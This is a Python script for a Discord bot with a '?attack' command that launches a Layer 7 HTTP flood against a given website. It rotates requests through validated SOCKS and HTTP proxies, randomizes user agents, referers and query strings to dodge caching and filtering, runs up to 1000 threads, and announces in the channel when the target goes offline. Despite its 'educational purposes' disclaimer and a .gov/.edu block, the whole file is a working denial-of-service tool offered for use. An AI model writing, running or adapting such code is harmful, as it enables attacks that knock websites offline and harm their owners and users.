#!/usr/bin/python3
# Discord Bot with Layer 7 DDoS Tool
# For educational purposes only
# Use responsibly and legally
import discord
from discord.ext import commands, tasks
import requests
import socket
import socks
import time
import random
import threading
import asyncio
import ssl
import datetime
from urllib.parse import urlparse
import logging
import os

# Set up logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='?', intents=intents)

# Global variables
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
]
referers = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
]
ind_dict = {}  # Tracks proxy request counts
proxies = []   # List of working proxies
target = ""
path = "/"
port = 80
protocol = "http"
attack_active = False
attack_thread = None
channel = None
proxy_types = ["socks5", "socks4", "http"]  # Order to try proxy types

# Proxy validation
def validate_proxy(proxy, timeout=1):
    """Validate a proxy by attempting a connection."""
    ip, port = proxy.split(":")
    port = int(port)
    for proto in proxy_types:
        try:
            if proto == "http":
                proxies_dict = {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
                response = requests.get(f"{protocol}://{target}", proxies=proxies_dict, timeout=timeout)
                if response.status_code:
                    return proto
            else:
                s = socks.socksocket()
                sock_type = socks.SOCKS4 if proto == "socks4" else socks.SOCKS5
                s.set_proxy(sock_type, ip, port)
                s.settimeout(timeout)
                s.connect((target, port))
                if protocol == "https":
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=target)
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                s.close()
                return proto
        except:
            if 's' in locals():
                s.close()
    return None

def load_proxies():
    """Load and validate proxies from proxies.txt."""
    global proxies
    proxies = []
    try:
        with open("proxies.txt", "r", encoding="utf-8") as f:
            temp_proxies = [line.strip() for line in f if line.strip() and ":" in line]
        logging.info(f"Found {len(temp_proxies)} proxies, validating...")
        valid_proxies = []
        threads = []
        lock = threading.Lock()
        def validate_and_append(proxy):
            proto = validate_proxy(proxy)
            if proto:
                with lock:
                    valid_proxies.append(proxy)
        for proxy in temp_proxies:
            th = threading.Thread(target=validate_and_append, args=(proxy,))
            th.start()
            threads.append(th)
            if len(threads) >= 100:  # Limit concurrent validation threads
                for th in threads:
                    th.join()
                threads = []
        for th in threads:
            th.join()
        proxies = valid_proxies
        logging.info(f"Loaded {len(proxies)} valid proxies")
        return len(proxies) > 0
    except FileNotFoundError:
        logging.error("proxies.txt not found")
        return False

def get_proxy_session(proxy):
    """Create a session for a proxy."""
    ip, port = proxy.split(":")
    port = int(port)
    proto = random.choice(proxy_types)  # Randomize to distribute load
    if proto == "http":
        return {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
    elif proto == "socks4":
        return (socks.SOCKS4, ip, port)
    elif proto == "socks5":
        return (socks.SOCKS5, ip, port)
    return None

# HTTP utilities
def getuseragent():
    """Generate a random User-Agent."""
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    os = {
        'Macintosh': random.choice(['Intel Mac OS X']),
        'Windows': random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 6.1']),
        'X11': random.choice(['Linux x86_64'])
    }[platform]
    browser = random.choice(['chrome', 'firefox'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = f"{random.randint(0, 99)}.0.{random.randint(0, 9999)}.{random.randint(0, 999)}"
        return f"Mozilla/5.0 ({os}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}"
    else:
        year = str(random.randint(2020, datetime.date.today().year))
        month = str(random.randint(1, 12)).zfill(2)
        day = str(random.randint(1, 30)).zfill(2)
        gecko = year + month + day
        version = f"{random.randint(1, 115)}.0"
        return f"Mozilla/5.0 ({os}; rv:{version}) Gecko/{gecko} Firefox/{version}"

def randomurl():
    """Generate a random URL query string."""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
    return f"{random.choice(strings)}{random.randint(0, 271400281257)}{random.choice(strings)}"

def GenReqHeader():
    """Generate HTTP GET request headers."""
    connection = "Connection: Keep-Alive\r\n"
    accept = random.choice(acceptall)
    referer = f"Referer: {random.choice(referers)}{target}{path}\r\n"
    useragent = f"User-Agent: {getuseragent()}\r\n"
    return referer + useragent + accept + connection + "\r\n"

def ParseUrl(url):
    """Parse the target URL."""
    global target, path, port, protocol
    parsed = urlparse(url.strip())
    protocol = parsed.scheme or "http"
    target = parsed.hostname
    path = parsed.path or "/"
    port = parsed.port or (443 if protocol == "https" else 80)
    if not target:
        raise ValueError("Invalid URL")

# Attack logic
def zeus(ind_rlock):
    """Perform GET-based attack."""
    global attack_active
    header = GenReqHeader()
    add = "&" if "?" in path else "?"
    while attack_active:
        proxy = random.choice(proxies)
        try:
            session = get_proxy_session(proxy)
            if isinstance(session, dict):  # HTTP proxy
                req = requests.get(
                    f"{protocol}://{target}{path}{add}{randomurl()}",
                    headers={
                        "Host": target,
                        "User-Agent": getuseragent(),
                        "Accept": acceptall[0].split("\r\n")[0].split(": ")[1],
                        "Referer": random.choice(referers) + target + path
                    },
                    proxies=session,
                    timeout=0.5  # Ultra-low timeout for high RPS
                )
                if req.status_code:
                    with ind_rlock:
                        ind_dict[proxy] += 1
            else:  # SOCKS proxy
                sock_type, ip, port_num = session
                s = socks.socksocket()
                s.set_proxy(sock_type, ip, port_num)
                s.settimeout(0.5)  # Ultra-low timeout
                s.connect((target, port))
                if protocol == "https":
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=target)
                get_host = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
                request = get_host + header
                sent = s.send(request.encode("utf-8"))
                if sent:
                    with ind_rlock:
                        ind_dict[proxy] += 1
                s.close()
        except Exception:
            if isinstance(session, tuple) and 's' in locals():
                s.close()
        time.sleep(0.001)  # Minimal delay to prevent CPU overload

def build_threads(thread_num, ind_rlock):
    """Start attack threads."""
    global attack_thread
    threads = []
    for _ in range(thread_num):
        th = threading.Thread(target=zeus, args=(ind_rlock,))
        th.daemon = True
        th.start()
        threads.append(th)
    attack_thread = threads

# Monitoring
async def monitor_site():
    """Monitor the target website for downtime."""
    global attack_active, channel
    last_status = None
    while attack_active:
        try:
            response = requests.get(f"{protocol}://{target}", timeout=3)
            status = response.status_code == 200
        except:
            status = False
        if status != last_status and not status:
            embed = discord.Embed(
                title="Target Down!",
                description=f"**Target**: {target}\n**Status**: Offline",
                color=discord.Color.red(),
                timestamp=datetime.datetime.utcnow()
            )
            await channel.send(embed=embed)
        last_status = status
        await asyncio.sleep(5)

# Bot commands
@bot.event
async def on_ready():
    """Bot startup event."""
    logging.info(f"Bot logged in as {bot.user}")
    print(f"Bot is ready! Logged in as {bot.user}")

@bot.command()
async def attack(ctx, website: str, threads: str):
    """Start a DDoS attack with the specified parameters."""
    global attack_active, channel, start_time, ind_dict, attack_thread, target, protocol
    if attack_active:
        await ctx.send("An attack is already in progress!")
        return

    # Validate inputs
    try:
        thread_num = int(threads)
        if thread_num > 1000:
            await ctx.send("Error: Threads must be ≤ 1000.")
            return
        if thread_num <= 0:
            raise ValueError
    except ValueError:
        await ctx.send("Error: Threads must be a positive integer.")
        return

    # Prevent attacks on restricted domains
    if any(domain in website.lower() for domain in ['.gov', '.edu']):
        await ctx.send("Error: Attacks on .gov/.edu websites are prohibited!")
        return

    # Parse URL
    try:
        ParseUrl(website)
    except ValueError:
        await ctx.send("Error: Invalid URL.")
        return

    # Load proxies
    if not load_proxies():
        await ctx.send("Error: No proxies found in proxies.txt.")
        return

    # Initialize attack
    attack_active = True
    channel = ctx.channel
    start_time = time.time()
    ind_dict = {proxy: 0 for proxy in proxies}
    ind_rlock = threading.RLock()

    # Send start embed
    embed = discord.Embed(
        title="Attack Started",
        description=(
            f"**Target**: {target}\n"
            f"**Threads**: {thread_num}\n"
            f"**Proxies**: {len(proxies)}"
        ),
        color=discord.Color.green(),
        timestamp=datetime.datetime.utcnow()
    )
    await ctx.send(embed=embed)

    # Start attack and monitoring
    build_threads(thread_num, ind_rlock)
    asyncio.create_task(monitor_site())

    # Keep bot running until interrupted
    try:
        while attack_active:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        attack_active = False
        embed = discord.Embed(
            title="Attack Stopped",
            description=f"**Target**: {target}\n**Status**: Attack stopped manually",
            color=discord.Color.orange(),
            timestamp=datetime.datetime.utcnow()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        attack_active = False
        embed = discord.Embed(
            title="Attack Stopped",
            description=f"**Target**: {target}\n**Status**: Attack stopped due to error: {str(e)}",
            color=discord.Color.red(),
            timestamp=datetime.datetime.utcnow()
        )
        await ctx.send(embed=embed)

# Run bot
if __name__ == "__main__":
    bot_token = "YOUR_BOT_TOKEN_HERE"  # Replace with your Discord bot token
    try:
        bot.run(bot_token)
    except Exception as e:
        logging.error(f"Failed to start bot: {e}")
        print(f"Error: Failed to start bot. Check your token and internet connection.")
